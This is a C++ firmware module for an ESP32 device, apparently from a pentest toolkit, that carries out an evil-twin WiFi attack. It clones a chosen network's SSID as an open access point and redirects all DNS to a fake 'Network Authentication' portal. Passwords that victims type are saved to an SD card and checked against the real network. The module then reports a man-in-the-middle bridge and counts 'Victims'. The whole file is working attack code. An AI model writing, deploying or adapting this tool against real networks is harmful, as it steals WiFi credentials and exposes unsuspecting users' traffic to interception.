#if !defined(LITE_VERSION)
#include "cred_forward.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include <AsyncTCP.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <SD.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <globals.h>

static AsyncWebServer *fwdServer = nullptr;
static DNSServer *fwdDns = nullptr;
static String targetSSID = "";
static String capturedPassword = "";
static bool credsCaptured = false;
static bool bridgeActive = false;
static int clientCount = 0;

static const char FWD_PORTAL_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Authentication Required</title>
<style>
body{font-family:-apple-system,sans-serif;background:#f0f2f5;margin:0;padding:20px;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{background:#fff;border-radius:12px;padding:32px;max-width:380px;width:100%;box-shadow:0 2px 16px rgba(0,0,0,0.1)}
h2{color:#1a1a2e;margin-bottom:8px}
p{color:#666;font-size:0.9rem;margin-bottom:20px}
input{width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:8px;font-size:1rem;box-sizing:border-box}
button{width:100%;padding:14px;background:#0066ff;color:#fff;border:none;border-radius:8px;font-size:1rem;font-weight:600;cursor:pointer;margin-top:8px}
.lock{text-align:center;font-size:2rem;margin-bottom:12px}
.net{color:#0066ff;font-weight:600}
</style></head>
<body><div class="box">
<div class="lock">&#128274;</div>
<h2>Network Authentication</h2>
<p>Enter the password for <span class="net">SSIDPLACEHOLDER</span> to continue browsing.</p>
<form method="POST" action="/connect">
<input name="password" type="password" placeholder="WiFi Password" required>
<button type="submit">Connect</button>
</form>
<p style="text-align:center;font-size:0.75rem;color:#999;margin-top:16px">Secured by your network administrator</p>
</div></body></html>
)rawliteral";

static const char FWD_SUCCESS_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connected</title>
<style>body{font-family:sans-serif;text-align:center;padding:60px;background:#f0f2f5}
h1{color:#00c853;font-size:3rem}p{color:#666}</style></head>
<body><h1>&#10004;</h1><h2>Connected!</h2><p>You now have internet access.</p>
<script>setTimeout(()=>window.close(),3000)</script></body></html>
)rawliteral";

static bool tryRealConnection(String ssid, String password) {
    WiFi.mode(WIFI_AP_STA);
    WiFi.begin(ssid.c_str(), password.c_str());
    unsigned long start = millis();
    while (millis() - start < 8000) {
        if (WiFi.status() == WL_CONNECTED) return true;
        delay(100);
        esp_task_wdt_reset();
    }
    return false;
}

static void enableBridge() {
    bridgeActive = true;
}

static void setupFwdRoutes(String ssid) {
    String portalHTML = String(FWD_PORTAL_HTML);
    portalHTML.replace("SSIDPLACEHOLDER", ssid);

    fwdServer->on("/", HTTP_GET, [portalHTML](AsyncWebServerRequest *request) {
        if (bridgeActive) request->redirect("http://www.google.com");
        else request->send(200, "text/html", portalHTML);
    });

    fwdServer->on("/generate_204", HTTP_GET, [portalHTML](AsyncWebServerRequest *request) {
        if (bridgeActive) request->send(204);
        else request->send(200, "text/html", portalHTML);
    });
    fwdServer->on("/hotspot-detect.html", HTTP_GET, [portalHTML](AsyncWebServerRequest *request) {
        if (bridgeActive) request->send(200, "text/html", "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>");
        else request->send(200, "text/html", portalHTML);
    });
    fwdServer->on("/connecttest.txt", HTTP_GET, [portalHTML](AsyncWebServerRequest *request) {
        if (bridgeActive) request->send(200, "text/plain", "Microsoft Connect Test");
        else request->send(200, "text/html", portalHTML);
    });

    fwdServer->on("/connect", HTTP_POST, [](AsyncWebServerRequest *request) {
        if (request->hasArg("password")) {
            capturedPassword = request->arg("password");
            credsCaptured = true;

            if (setupSdCard()) {
                File f = SD.open("/creds.txt", FILE_APPEND);
                if (f) {
                    f.printf("[CredFwd] SSID:%s PASS:%s\n", targetSSID.c_str(), capturedPassword.c_str());
                    f.close();
                }
            }

            request->send(200, "text/html", FWD_SUCCESS_HTML);
        } else {
            request->send(400, "text/plain", "Missing password");
        }
    });

    fwdServer->onNotFound([portalHTML](AsyncWebServerRequest *request) {
        if (bridgeActive) request->redirect("http://" + request->host() + request->url());
        else request->send(200, "text/html", portalHTML);
    });
}

void credForward() {
    credsCaptured = false;
    bridgeActive = false;
    capturedPassword = "";

    drawMainBorderWithTitle("Cred Forward");
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setTextSize(FP);
    tft.drawCentreString(String("Scanning networks..."), tftWidth / 2, tftHeight / 2, 1);

    WiFi.mode(WIFI_STA);
    int n = WiFi.scanNetworks(false, false);

    if (n == 0) {
        displayRedStripe("No networks found");
        delay(1500);
        return;
    }

    options.clear();
    for (int i = 0; i < n && i < 15; i++) {
        String label = WiFi.SSID(i) + " " + String(WiFi.RSSI(i)) + "dB";
        int idx = i;
        options.push_back({label, [idx]() {
            targetSSID = WiFi.SSID(idx);
        }});
    }
    loopOptions(options, MENU_TYPE_SUBMENU, "Target Network");
    WiFi.scanDelete();

    if (targetSSID.length() == 0) return;

    WiFi.mode(WIFI_AP);
    WiFi.softAP(targetSSID.c_str(), "");
    delay(100);

    fwdDns = new DNSServer();
    fwdDns->start(53, "*", WiFi.softAPIP());

    fwdServer = new AsyncWebServer(80);
    setupFwdRoutes(targetSSID);
    fwdServer->begin();

    unsigned long startTime = millis();

    while (true) {
        fwdDns->processNextRequest();
        clientCount = WiFi.softAPgetStationNum();

        drawMainBorderWithTitle("Cred Forward");
        int y = 38;
        int padX = 10;

        if (!credsCaptured) {
            tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
            tft.setTextSize(FP);
            tft.setCursor(padX, y);
            tft.print("Waiting for creds...");
            y += 16;

            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.setCursor(padX, y);
            tft.print("AP: " + targetSSID.substring(0, 18));
            y += 14;
            tft.setCursor(padX, y);
            tft.printf("Clients: %d", clientCount);
            y += 14;

            unsigned long elapsed = (millis() - startTime) / 1000;
            tft.setCursor(padX, y);
            tft.printf("Elapsed: %lus", elapsed);
        } else if (!bridgeActive) {
            tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
            tft.setTextSize(FP);
            tft.setCursor(padX, y);
            tft.print("PASSWORD CAPTURED!");
            y += 16;

            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.setCursor(padX, y);
            tft.print("Pass: " + capturedPassword.substring(0, 20));
            y += 16;

            tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
            tft.setCursor(padX, y);
            tft.print("Connecting to real AP...");

            if (tryRealConnection(targetSSID, capturedPassword)) {
                enableBridge();
            } else {
                tft.setCursor(padX, y + 14);
                tft.setTextColor(TFT_RED, bruceConfig.bgColor);
                tft.print("Wrong password! Waiting...");
                credsCaptured = false;
                capturedPassword = "";
                delay(2000);
            }
        } else {
            tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
            tft.setTextSize(FP);
            tft.setCursor(padX, y);
            tft.print("BRIDGE ACTIVE - MITM!");
            y += 16;

            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.setCursor(padX, y);
            tft.print("SSID: " + targetSSID.substring(0, 18));
            y += 14;
            tft.setCursor(padX, y);
            tft.print("Pass: " + capturedPassword.substring(0, 18));
            y += 14;
            tft.setCursor(padX, y);
            tft.printf("Victims: %d", clientCount);
            y += 14;
            tft.setCursor(padX, y);
            tft.print("Real IP: " + WiFi.localIP().toString());
            y += 14;

            tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
            tft.setCursor(padX, y);
            tft.print("Traffic flowing through you");
        }

        tft.setTextColor(TFT_RED, bruceConfig.bgColor);
        tft.drawCentreString(String("Esc to stop"), tftWidth / 2, tftHeight - 18, 1);

        if (check(EscPress)) break;
        esp_task_wdt_reset();
        delay(300);
    }

    fwdServer->end();
    delete fwdServer;
    fwdServer = nullptr;
    fwdDns->stop();
    delete fwdDns;
    fwdDns = nullptr;
    WiFi.softAPdisconnect(true);
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
}
#endif
